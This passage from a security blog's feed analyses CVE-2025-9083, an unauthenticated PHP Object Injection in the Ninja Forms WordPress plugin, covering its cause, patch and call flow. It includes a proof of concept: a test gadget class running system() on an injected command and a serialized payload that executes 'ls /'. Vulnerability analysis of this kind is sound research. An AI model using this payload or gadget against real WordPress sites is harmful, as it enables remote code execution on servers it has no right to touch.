href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; – &lt;strong&gt;Ninja Forms&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.11.0&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.11.1&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability originates from the &lt;code&gt;extractSubmissions()&lt;/code&gt; function inside the &lt;code&gt;FieldsetRepeater.php&lt;/code&gt; file:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if(is_string($fieldSubmissionValue)){&#xA;    $fieldSubmissionValue = maybe_unserialize($fieldSubmissionValue);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;maybe_unserialize()&lt;/code&gt; is called without any protection against PHP Object Injection.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/diff.png&#34; title=&#34;Bug and patch&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Bug and patch&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/diff.png&#39; alt=&#34;Diff&#34; height=&#34;148&#34; width=&#34;1891&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Bug and patch&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The patch replaces &lt;code&gt;maybe_unserialize()&lt;/code&gt; with &lt;code&gt;unserialize()&lt;/code&gt; and disables object creation using &lt;code&gt;[&#39;allowed_classes&#39; =&amp;gt; false]&lt;/code&gt;, preventing PHP Object Injection altogether.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/class_name.png&#34; title=&#34;Class name&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/class_name.png&#34; data-sub-html=&#34;&lt;h2&gt;Class Name&lt;/h2&gt;&lt;p&gt;Class name&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/class_name.png&#39; alt=&#34;Class Name&#34; height=&#34;335&#34; width=&#34;1117&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Class name&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The class name corresponds to a layout field when creating a blank form with the plugin.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/create_form.png&#34; title=&#34;Create form with Repeatable Fieldset&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/create_form.png&#34; data-sub-html=&#34;&lt;h2&gt;Create Form&lt;/h2&gt;&lt;p&gt;Create form with Repeatable Fieldset&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/create_form.png&#39; alt=&#34;Create Form&#34; height=&#34;782&#34; width=&#34;1915&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Create form with Repeatable Fieldset&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Create a form with &lt;strong&gt;Repeatable Fieldset&lt;/strong&gt;, then drag a &lt;strong&gt;Single Line Text&lt;/strong&gt; field into it as input, and embed the form into a post or page.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/embed_form.png&#34; title=&#34;Embed form into post&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/embed_form.png&#34; data-sub-html=&#34;&lt;h2&gt;Embed Form&lt;/h2&gt;&lt;p&gt;Embed form into post&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/embed_form.png&#39; alt=&#34;Embed Form&#34; height=&#34;455&#34; width=&#34;1192&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Embed form into post&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Publish the post and submit the form with a &lt;code&gt;payload&lt;/code&gt; value:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/request1.png&#34; title=&#34;Request test with `payload`&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/request1.png&#34; data-sub-html=&#34;&lt;h2&gt;Request&lt;/h2&gt;&lt;p&gt;Request test with `payload`&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/request1.png&#39; alt=&#34;Request&#34; height=&#34;967&#34; width=&#34;1874&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Request test with `payload`&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;We see that all data is assigned to the &lt;code&gt;formData&lt;/code&gt; parameter. Copy the URL-decoded content into an online JSON formatter:&#xA;&lt;a href=&#34;https://jsonformatter.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://jsonformatter.org/&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/format.png&#34; title=&#34;Formatted JSON data&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/format.png&#34; data-sub-html=&#34;&lt;h2&gt;Format&lt;/h2&gt;&lt;p&gt;Formatted JSON data&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/format.png&#39; alt=&#34;Format&#34; height=&#34;834&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Formatted JSON data&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Observing the debugger shows the similarity:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/debug1.png&#34; title=&#34;Debugger data&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/debug1.png&#34; data-sub-html=&#34;&lt;h2&gt;Debug&lt;/h2&gt;&lt;p&gt;Debugger data&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/debug1.png&#39; alt=&#34;Debug&#34; height=&#34;331&#34; width=&#34;1596&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Debugger data&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$fieldSubmissionValue&lt;/code&gt; corresponds to the &lt;code&gt;value&lt;/code&gt; of the field with ID &lt;code&gt;8&lt;/code&gt;. Thus, when &lt;code&gt;value&lt;/code&gt; is a string, it triggers &lt;code&gt;maybe_unserialize()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;We create a class and place it in &lt;code&gt;wp-config.php&lt;/code&gt; to test the invocation when &lt;code&gt;maybe_unserialize()&lt;/code&gt; runs:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class ObjectInjection&#xA;{&#xA;   public $command;&#xA;&#xA;   function __destruct(){&#xA;&#x9;&#x9;die(system($this-&amp;gt;command));&#xA;   }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Resubmit the request with a serialized payload as the new &lt;code&gt;value&lt;/code&gt;. Because the payload is wrapped inside JSON, quotes must be escaped (&lt;code&gt;\&amp;quot;&lt;/code&gt;) to avoid breaking the JSON structure.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/change_value.png&#34; title=&#34;Change the value to serialized string&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/change_value.png&#34; data-sub-html=&#34;&lt;h2&gt;Change Value&lt;/h2&gt;&lt;p&gt;Change the value to serialized string&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/change_value.png&#39; alt=&#34;Change Value&#34; height=&#34;843&#34; width=&#34;1917&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Change the value to serialized string&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/debug2.png&#34; title=&#34;Value inside debugger&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/debug2.png&#34; data-sub-html=&#34;&lt;h2&gt;Debug2&lt;/h2&gt;&lt;p&gt;Value inside debugger&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/debug2.png&#39; alt=&#34;Debug2&#34; height=&#34;305&#34; width=&#34;1920&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Value inside debugger&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Shell execution occurs → Deserialization is triggered.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/result.png&#34; title=&#34;Deserialization triggered&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Deserialization triggered&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/result.png&#39; alt=&#34;Result&#34; height=&#34;836&#34; width=&#34;1917&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Deserialization triggered&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;Callstack flow:&lt;/p&gt;&#xA;&lt;p&gt;The application registers an AJAX handler for unauthenticated users:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if( isset( $_POST[&amp;#39;formData&amp;#39;] ) ) {&#xA;    $this-&amp;gt;_form_data = json_decode( $_POST[&amp;#39;formData&amp;#39;], TRUE );&#xA;&#xA;    // php5.2 fallback&#xA;    if( ! $this-&amp;gt;_form_data ) $this-&amp;gt;_form_data = json_decode( stripslashes( $_POST[&amp;#39;formData&amp;#39;] ), TRUE );&#xA;}&#xA;add_action( &amp;#39;wp_ajax_nopriv_nf_ajax_submit&amp;#39;, array( $this, &amp;#39;submit&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This means when sending a POST request to &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; with &lt;code&gt;action=nf_ajax_submit&lt;/code&gt;, the &lt;code&gt;submit&lt;/code&gt; callback is triggered.&lt;/p&gt;&#xA;&lt;p&gt;A fully submitted form follows this call flow:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/callstack.png&#34; title=&#34;Callstack diagram&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/callstack.png&#34; data-sub-html=&#34;&lt;h2&gt;Callstack&lt;/h2&gt;&lt;p&gt;Callstack diagram&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/callstack.png&#39; alt=&#34;Callstack&#34; height=&#34;247&#34; width=&#34;682&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Callstack diagram&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;POST /wp-admin/admin-ajax.php&amp;#34;] -- action=nf_ajax_submit&amp;amp;security=security_code&amp;amp;formData=form_data --&amp;gt; B[&amp;#34;wp_ajax_nopriv_nf_ajax_submit&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;NF_AJAX_Controllers_Submission::submit()&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;NF_AJAX_Controllers_Submission::process()&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;NF_MergeTags_Fields::add_field()&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;NF_MergeTags_Fields::generateFieldsetTableRows()&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;NF_Handlers_FieldsetRepeater::extractSubmissions()&amp;#34;] --&amp;gt; H{$fieldSubmissionValue is String?}&#xA;H -- Yes --&amp;gt; I[&amp;#34;maybe_unserialize($fieldSubmissionValue)&amp;#34;]&#xA;I --&amp;gt; K(&amp;#34;RCE&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Use the plugin to create a blank form with a &lt;code&gt;Single Line Text&lt;/code&gt; field inside a &lt;code&gt;Repeatable Fieldset&lt;/code&gt;, then embed it in a post/page.&lt;/li&gt;&#xA;&lt;li&gt;Submit the form and intercept the request using Burp Suite.&lt;/li&gt;&#xA;&lt;li&gt;Replace the &lt;code&gt;value&lt;/code&gt; of the field with a serialized payload instead of JSON.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#34;O:15:\&amp;#34;ObjectInjection\&amp;#34;:1:{s:7:\&amp;#34;command\&amp;#34;;s:4:\&amp;#34;ls /\&amp;#34;;}&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Resend the request.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;Tip&lt;/p&gt;&lt;p&gt;To test locally, create a class with a &lt;code&gt;__wakeup()&lt;/code&gt; magic method that triggers upon deserialization, and place it in &lt;code&gt;wp-config.php&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class ObjectInjection&#xA;{&#xA;  public $command;&#xA;  function __destruct(){&#xA;  &#x9;die(system($this-&amp;gt;command));&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;p&gt;The CVE-2025-9083 vulnerability stems from using &lt;code&gt;maybe_unserialize()&lt;/code&gt; on user-controlled input without any class restriction or validation. This enables unauthenticated attackers to execute arbitrary code if a suitable gadget exists within WordPress or other plugins/themes. The 3.11.1 patch completely prevents object creation by switching to &lt;code&gt;unserialize()&lt;/code&gt; with &lt;code&gt;[&#39;allowed_classes&#39; =&amp;gt; false]&lt;/code&gt;, effectively mitigating the root cause of the PHP Object Injection.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;maybe_unserialize()&lt;/code&gt; is extremely dangerous when applied to user input.&lt;/li&gt;&#xA;&lt;li&gt;A single gadget anywhere in the codebase can lead to Remote Code Execution.&lt;/li&gt;&#xA;&lt;li&gt;WordPress AJAX endpoints exposed to unauthenticated users are high-value targets.&lt;/li&gt;&#xA;&lt;li&gt;JSON embedding requires careful escaping of serialized payloads to avoid breaking structure.&lt;/li&gt;&#xA;&lt;li&gt;The 3.11.1 patch demonstrates that controlling allowed classes during unserialization is a critical defensive measure.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ninja-forms/vulnerability/wordpress-ninja-forms-plugin-3-11-1-unauthenticated-php-object-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Ninja Forms Plugin &amp;lt; 3.11.1 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-7847 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-13-cve-2025-7847/</link>
      <pubDate>Thu, 13 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-13-cve-2025-7847/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
